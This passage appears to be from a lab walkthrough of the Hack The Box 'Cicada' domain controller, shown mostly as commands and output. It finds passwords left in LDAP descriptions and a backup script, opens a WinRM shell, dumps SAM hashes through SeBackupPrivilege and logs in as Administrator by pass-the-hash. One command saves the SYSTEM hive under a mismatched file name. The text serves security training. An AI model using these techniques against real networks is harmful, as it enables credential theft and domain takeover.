SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8                                                 
GET-DESC... 10.10.11.35     389    CICADA-DC        [+] Found following users:                                                                                
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Administrator description: Built-in account for administering the computer/domain                   
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Guest description: Built-in account for guest access to the computer/domain                         
GET-DESC... 10.10.11.35     389    CICADA-DC        User: krbtgt description: Key Distribution Center Service Account                                         
GET-DESC... 10.10.11.35     389    CICADA-DC        User: david.orelious description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

## Access as emily.oscars

### More Hardcoded Credentials in SMB Share (Authenticated)

Enumerating SMB with `david.orelious` shows that this user has access to the DEV share.

```
$nxc smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3'  --shares                                                                                     
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3                                                              
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares                                                                                     
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark                                                                    
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------                                                                    
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin                                                              
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share                                                             
SMB         10.10.11.35     445    CICADA-DC        DEV             READ                                                                                      
SMB         10.10.11.35     445    CICADA-DC        HR              READ                                                                                      
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC                                                                
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share                                                        
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

The DEV share contained a powershell script for backups.

```
$smbclient //10.10.11.35/DEV -U david.orelious                                                                                                           
Password for [WORKGROUP\david.orelious]:                                                                                                                      
Try "help" to get a list of possible commands.                                                                                                                
smb: \> ls                                                                                                                                                    
  .                                   D        0  Thu Mar 14 12:31:39 2024                                                                                    
  ..                                  D        0  Thu Mar 14 12:21:29 2024                                                                                    
  Backup_script.ps1                   A      601  Wed Aug 28 17:28:22 2024                                                                                    
                                                                                                                                                              
                4168447 blocks of size 4096. 120687 blocks available
```

Another set of credentials was discovered for `emily.oscar`.

```
$cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Privilege Escalation

### Enumerating Privileges for emily.oscars

The credentials worked for `emily.oscars`, and note that `nxc` is suggesting that this user has admin privileges (Pwn3d!). So, easy win? 🤔

```
$nxc ldap 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

We can use the `group-mem` module from `nxc` to enumerate domain group members.
If we look at the Domain Admins group, `emily.oscars` is not in it.

```
$nxc ldap 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -M group-mem -o GROUP="Domain Admins"
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
GROUP-MEM   10.10.11.35     389    CICADA-DC        [+] Found the following members of the Domain Admins group:
GROUP-MEM   10.10.11.35     389    CICADA-DC        Administrator
```

We can confirm this by checking the user's privilege over the `ADMIN$` share.
However, `emily.oscars` only has read access to this share.
We would need write access to the `ADMIN$` share to escalate privileges via psexec.
So it seems like `impacket` reports Pwn3d! as long as the user has access to the `ADMIN$` share, even if they do not have write access.

```
$nxc smb 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$          READ            Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$              READ,WRITE      Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

`emily.oscars` gives us a shell on the box through WinRM, and we can read the user flag.

```
$evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

### SeBackUpPrivilege - SAM Dump

The read access over the `ADMIN$` share stood out earlier, so I first enumerated for any interesting privileges or groups that the user belonged to.

If we look at the output below, the user is a member of the Backup Operators group, which grants them the `SeBackUpPrivilege` to backup and restore files on the domain controller, regardless of permissions set on them.


```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We can abuse this privilege to perform a SAM dump, and extract the administrator's NTLM hash.

```
*Evil-WinRM* PS C:\Temp> reg save hklm\sam sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system security.save
The operation completed successfully.
```

Once the registry hives are transferred over to our host, we can use `secretsdump` to extract the hashes.

```
$secretsdump.py -sam sam.save -system system.save LOCAL                                                                                                                                                                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                        
                                                                                                                                                                                                                                             
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620                                                                                                                                                                                
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                                                                                                         
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::                                                                                                                                                       
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                               
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                      
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                                                                     
[*] Cleaning up..
```

This gave us the administrator's NTLM hash (`aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341`), and checking against the DC confirms that we have a valid session.

From here, you can get a shell as the administrator via WinRM or psexec.

```
$nxc ldap 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'                                                                                                                                                            
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
```
